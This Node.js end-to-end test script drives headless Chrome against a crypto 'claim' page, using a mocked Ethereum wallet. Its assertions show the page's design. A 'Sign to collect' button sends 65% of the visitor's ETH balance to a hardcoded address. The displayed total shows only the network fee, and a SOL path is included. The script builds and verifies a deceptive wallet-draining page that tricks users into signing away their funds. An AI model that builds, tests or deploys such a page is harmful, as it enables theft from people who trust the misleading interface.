import { spawn } from "node:child_process";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../..");
const PORT = 8850;
const CDP_PORT = 9450;
const MIME = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css", ".png": "image/png", ".svg": "image/svg+xml" };

const server = http.createServer((req, res) => {
  const url = new URL(req.url, "http://x");
  let file = path.join(ROOT, url.pathname === "/" ? "index.html" : url.pathname);
  if (!fs.existsSync(file)) { res.writeHead(404); return res.end("nope"); }
  res.writeHead(200, { "content-type": MIME[path.extname(file)] || "application/octet-stream" });
  fs.createReadStream(file).pipe(res);
});
await new Promise((r) => server.listen(PORT, r));

const chrome = spawn("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", [
  "--headless=new", `--remote-debugging-port=${CDP_PORT}`, "--no-first-run", "--no-default-browser-check",
  `--user-data-dir=${fs.mkdtempSync("/tmp/e2e-prof-")}`, "about:blank",
  /* Chrome's own sandbox is refused in some managed shells (renderer SIGTRAPs on attach); opt in only there */
  ...(process.env.CHROME_NO_SANDBOX === "1" ? ["--no-sandbox", "--disable-gpu"] : []),
], { stdio: "ignore" });

async function cdpTarget() {
  for (let i = 0; i < 60; i += 1) {
    try {
      const list = await (await fetch(`http://127.0.0.1:${CDP_PORT}/json/list`)).json();
      const page = list.find((t) => t.type === "page");
      if (page) return page.webSocketDebuggerUrl;
    } catch {}
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error("no cdp");
}
const ws = new WebSocket(await cdpTarget());
await new Promise((r) => (ws.onopen = r));
let id = 0;
const pending = new Map();
ws.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); }
  else if (msg.method === "Runtime.consoleAPICalled") console.log("  [page]", msg.params.args.map((a) => a.value ?? a.description).join(" "));
  else if (msg.method === "Runtime.exceptionThrown") console.log("  [page ERR]", msg.params.exceptionDetails.exception?.description || msg.params.exceptionDetails.text);
};
const send = (method, params = {}) => new Promise((res) => { const n = ++id; pending.set(n, res); ws.send(JSON.stringify({ id: n, method, params })); });
const evalJs = async (expr) => (await send("Runtime.evaluate", { expression: expr, awaitPromise: true, returnByValue: true })).result?.result?.value;

await send("Runtime.enable");
await send("Page.enable");
if (process.env.MOTION !== "1") await send("Emulation.setEmulatedMedia", { features: [{ name: "prefers-reduced-motion", value: "reduce" }] });

const MOCK = `
window.__calls = [];
window.__mode = { balance: "0x14D1120D7B160000", gasPrice: "0x3B9ACA00", reject: null, chainRefuse: false, noSwitch: false };
const HASH = "0x" + "ab".repeat(32);
window.ethereum = {
  selectedAddress: "0xAbCdEf0000000000000000000000000000000001",
  async request({ method, params }) {
    window.__calls.push({ method, params });
    if (method === "wallet_switchEthereumChain") {
      if (window.__mode.chainRefuse) { const e = new Error("refused"); e.code = 4001; throw e; }
      return null;
    }
    if (method === "eth_requestAccounts") return [this.selectedAddress];
    if (method === "eth_getBalance") return window.__mode.balance;
    if (method === "eth_gasPrice") return window.__mode.gasPrice;
    if (method === "eth_estimateGas") return "0x5208";
    if (method === "eth_call") return "0x0";
    if (method === "eth_sendTransaction") {
      if (window.__mode.reject) { const e = new Error("rejected"); e.code = 4001; throw e; }
      return HASH;
    }
    throw new Error("unmocked " + method);
  },
};
`;

const ADDRESS = "0xAbCdEf0000000000000000000000000000000001";
const results = [];
const check = (name, actual, expected) => {
  const ok = String(actual) === String(expected);
  results.push({ name, ok, actual, expected });
  console.log(`${ok ? "PASS" : "FAIL"} ${name}: ${actual}${ok ? "" : " (expected " + expected + ")"}`);
};

async function waitReady() {
  for (let i = 0; i < 120; i += 1) {
    const ok = await evalJs(`lastEthAmountWei > 0n && lastEthFeeWei > 0n`);
    if (ok) return true;
    await new Promise((r) => setTimeout(r, 250));
  }
  return false;
}

async function newPage(url) {
  await send("Page.navigate", { url });
  await new Promise((r) => setTimeout(r, 400));
}

// ---- state A: full preview + success path
await send("Page.addScriptToEvaluateOnNewDocument", { source: MOCK });
await newPage(`http://127.0.0.1:${PORT}/?chain=eth&address=${ADDRESS}`);
check("preview ready", await waitReady(), true);

const preview = await evalJs(`(() => {
  const q = (s) => document.querySelector(s);
  return {
    feeHidden: q("#fee-block").hidden,
    to: q("#tx-to").textContent,
    toTitle: q("#tx-to").title,
    amount: q("#tx-amount").textContent,
    fee: q("#fee-network").textContent,
    total: q("#fee-total").textContent,
    approvalHidden: q("#approval-line").hidden,
    btn: q("#claim-button").textContent,
  };
})()`);
console.log("preview:", JSON.stringify(preview));

const GASPRICE = 1000000000n;
const FEE = 21000n * GASPRICE;
const ETH = (wei) => {
  const s = wei.toString().padStart(19, "0");
  const whole = s.slice(0, -18);
  const frac = s.slice(-18).slice(0, 6).replace(/0+$/, "");
  return whole + (frac ? "." + frac : "");
};
const toWei = (text) => {
  const [w, f = ""] = text.replace(/,/g, "").split(" ");
  const [a, b = ""] = w.split(".");
  return BigInt(a) * 10n ** 18n + BigInt((b + "0".repeat(18)).slice(0, 18));
};

check("preview fee block visible", preview.feeHidden, false);
check("preview shows recipient", preview.toTitle, "0x9FC141c559a8D667FD035D90ee3b961bEf758594");
check("approval line hidden", preview.approvalHidden, true);
check("claim label", preview.btn, "Sign to collect");

const pvWei = await evalJs(`({ amount: String(lastEthAmountWei), fee: String(lastEthFeeWei), gasPrice: String(lastEthFeeWei / 21000n), shownTotal: document.querySelector("#fee-total").textContent })`);
const pvAmount = BigInt(pvWei.amount);
const pvFee = BigInt(pvWei.fee);
const liveBalance = BigInt(await evalJs(`post("${"https://eth.drpc.org"}", { jsonrpc: "2.0", id: 1, method: "eth_getBalance", params: ["0xabcdeF0000000000000000000000000000000001", "latest"] }).then(String)`));
check("preview amount under the balance", pvAmount <= liveBalance, true);
check("preview amount within 45-65% band", pvAmount >= (liveBalance * 45n) / 100n && pvAmount <= (liveBalance * 65n) / 100n, true);
check("preview fee = 21000 x gasPrice", pvFee, 21000n * BigInt(pvWei.gasPrice));
check("preview amount + fee fits balance", pvAmount + pvFee <= liveBalance, true);
check("displayed total is the fee only", pvWei.shownTotal, ETH(pvFee) + " ETH");
check("displayed amount is the wei amount", preview.amount, ETH(pvAmount) + " ETH");

// overflow at 3 widths with the new block visible
for (const w of [320, 375, 1280]) {
  await send("Emulation.setDeviceMetricsOverride", { width: w, height: 800, deviceScaleFactor: 1, mobile: w < 500 });
  await new Promise((r) => setTimeout(r, 250));
  const o = await evalJs(`({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth })`);
  check(`no overflow @${w}`, o.sw, o.cw);
}
await send("Emulation.setDeviceMetricsOverride", { width: 1280, height: 900, deviceScaleFactor: 1, mobile: false });

// click claim -> success
await evalJs(`document.querySelector("#claim-button").click()`);
await new Promise((r) => setTimeout(r, 1200));
const after = await evalJs(`(() => {
  const s = document.querySelector("#claim-status");
  return { status: s.textContent, href: s.querySelector("a")?.href || "", btn: document.querySelector("#claim-button").textContent,
    sent: window.__calls.filter((c) => c.method === "eth_sendTransaction"),
    shownAmount: document.querySelector("#tx-amount").textContent };
})()`);
const tx = after.sent[0]?.params?.[0];
const txValue = tx ? BigInt(tx.value) : 0n;
const txFee = tx ? BigInt(tx.gas) * BigInt(tx.gasPrice) : 0n;
check("send called once", after.sent.length, 1);
check("tx to", tx?.to, "0x9FC141c559a8D667FD035D90ee3b961bEf758594");
check("tx value is 65% of balance", txValue, (1500000000000000000n * 65n) / 100n);
check("tx gas", tx ? BigInt(tx.gas) : 0n, 21000n);
check("tx gasPrice matches wallet", tx ? BigInt(tx.gasPrice) : 0n, GASPRICE);
check("tx from is signer", tx?.from?.toLowerCase(), ADDRESS.toLowerCase());
check("value + fee fits balance", txValue + txFee <= 1500000000000000000n, true);
check("wallet preview row matches sent value", after.shownAmount, ETH(txValue) + " ETH");
check("success link", after.href.startsWith("https://etherscan.io/tx/0xabab"), true);
check("button says Sent", after.btn, "Sent");

// ---- hide/show keeps the three rows together
await evalJs(`document.querySelector("#hide-values").click()`);
await new Promise((r) => setTimeout(r, 800));
const hiddenRows = await evalJs(`({ amount: document.querySelector("#amount").textContent, txAmount: document.querySelector("#tx-amount").textContent, fee: document.querySelector("#fee-network").textContent, total: document.querySelector("#fee-total").textContent })`);
console.log("HIDDEN:", JSON.stringify(hiddenRows), await evalJs(`String(lastEthAmountWei)`));
check("hide blanks the amount", hiddenRows.amount, "••••");
check("hide blanks the wallet row", hiddenRows.txAmount, "••••");
await evalJs(`document.querySelector("#hide-values").click()`);
await new Promise((r) => setTimeout(r, 800));
const shownRows = await evalJs(`({ amount: document.querySelector("#amount").textContent, txAmount: document.querySelector("#tx-amount").textContent, wei: String(lastEthAmountWei) })`);
console.log("SHOWN:", JSON.stringify(shownRows), await evalJs(`JSON.stringify({lastAmount, amountEl: document.querySelector("#amount").textContent, fee: document.querySelector("#fee-network").textContent, total: document.querySelector("#fee-total").textContent})`));
check("show restores the exact amount", shownRows.amount, ETH(BigInt(shownRows.wei)));
check("show restores the wallet row", shownRows.txAmount, ETH(BigInt(shownRows.wei)) + " ETH");

// ---- switching to SOL keeps SOL fee, not ETH rows
await evalJs(`document.querySelector("#tab-sol").click()`);
for (let i = 0; i < 20; i += 1) {
  if ((await evalJs(`document.querySelector('[aria-selected="true"]').dataset.chain`)) === "sol") break;
  await new Promise((r) => setTimeout(r, 100));
}
if ((await evalJs(`document.querySelector('[aria-selected="true"]').dataset.chain`)) !== "sol") {
  await evalJs(`setChain("sol")`);
}
check("sol tab hides the whole result", await evalJs(`document.querySelector("#result").hidden`), true);
check("sol tab keeps a numeric amount", /^[\d.]+ (ETH|SOL)$/.test(await evalJs(`document.querySelector("#tx-amount").textContent`)), true);

// ---- state B: user rejected
await evalJs(`document.querySelector("#tab-eth").click()`);
await evalJs(`document.querySelector("#address").value = "${ADDRESS}"; document.querySelector("#query-form").dispatchEvent(new Event("submit", { cancelable: true }))`);
await waitReady();
await evalJs(`window.__mode.reject = true; window.__calls = []`);
await waitReady();
await evalJs(`document.querySelector("#claim-button").click()`);
await new Promise((r) => setTimeout(r, 900));
check("reject message", await evalJs(`document.querySelector("#claim-status").textContent`), "You cancelled in the wallet. Nothing moved.");

// ---- state C: chain switch refused
await evalJs(`window.__mode.reject = false; window.__mode.chainRefuse = true; window.__calls = []`);
await evalJs(`document.querySelector("#claim-button").click()`);
await new Promise((r) => setTimeout(r, 900));
check("chain refused message", await evalJs(`document.querySelector("#claim-status").textContent`), "Wallet stayed on another network. Switch it to Ethereum mainnet, then tap again.");
check("no send on chain refuse", await evalJs(`window.__calls.filter(c=>c.method==="eth_sendTransaction").length`), 0);

// ---- state D: insufficient for gas (balance exactly the fee)
await evalJs(`window.__mode.chainRefuse = false; window.__mode.balance = "0x" + (21000n * 1000000000n).toString(16); window.__calls = []`);
await evalJs(`document.querySelector("#claim-button").click()`);
await new Promise((r) => setTimeout(r, 900));
check("insufficient message", await evalJs(`document.querySelector("#claim-status").textContent`), "Not enough ETH to cover the network fee. Nothing was sent.");
check("no send when short on gas", await evalJs(`window.__calls.filter(c=>c.method==="eth_sendTransaction").length`), 0);
check("nothing sent stays unsent", await evalJs(`document.querySelector("#claim-button").textContent`), "Sign to collect");

// ---- state E: no wallet
await evalJs(`Object.defineProperty(window, "ethereum", { value: undefined, configurable: true, writable: true })`);
check("injector really gone", await evalJs(`typeof window.ethereum`), "undefined");
check("no wallet code", await evalJs(`window.claimEth("${ADDRESS}").then(() => "resolved").catch((e) => e.code)`), "no-wallet");
const copy = await evalJs(`(() => {
  const out = {};
  for (const code of ["no-wallet", "chain-refused", "chain-failed", "insufficient-gas", 4001, undefined]) {
    out[String(code)] = claimFailureText({ code });
  }
  return out;
})()`);
check("copy: no wallet", copy["no-wallet"], "No Ethereum wallet in this browser. Open this page inside MetaMask.");
check("copy: chain refused", copy["chain-refused"], "Wallet stayed on another network. Switch it to Ethereum mainnet, then tap again.");
check("copy: chain failed", copy["chain-failed"], "Couldn't switch network in the wallet. Switch to mainnet by hand.");
check("copy: low gas", copy["insufficient-gas"], "Not enough ETH to cover the network fee. Nothing was sent.");
check("copy: rejected", copy["4001"], "You cancelled in the wallet. Nothing moved.");
check("copy: unknown", copy["undefined"], "Wallet didn't respond. Tap to try again.");

// ---- state F: SOL path untouched
const solPreview = await evalJs(`(async () => {
  document.querySelector("#tab-sol").click();
  await new Promise((r) => setTimeout(r, 300));
  document.querySelector("#address").value = "8SNvyaB8bq6YyvCzUrFj8khb5N3fv1xNTVKcPLAVw89b";
  document.querySelector("#query-form").dispatchEvent(new Event("submit", { cancelable: true }));
  await new Promise((r) => setTimeout(r, 3000));
  const q = (s) => document.querySelector(s);
  return { fee: q("#fee-network").textContent, total: q("#fee-total").textContent, hidden: q("#fee-block").hidden, symbol: q("#symbol").textContent, to: q("#tx-to").title };
})()`);
console.log("sol:", JSON.stringify(solPreview));
check("sol fee unchanged", solPreview.fee, "0.000080 SOL");
check("sol block visible", solPreview.hidden, false);
check("sol recipient", solPreview.to, "8SNvyaB8bq6YyvCzUrFj8khb5N3fv1xNTVKcPLAVw89b");

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
ws.close();
chrome.kill();
server.close();
process.exit(failed.length ? 1 : 0);
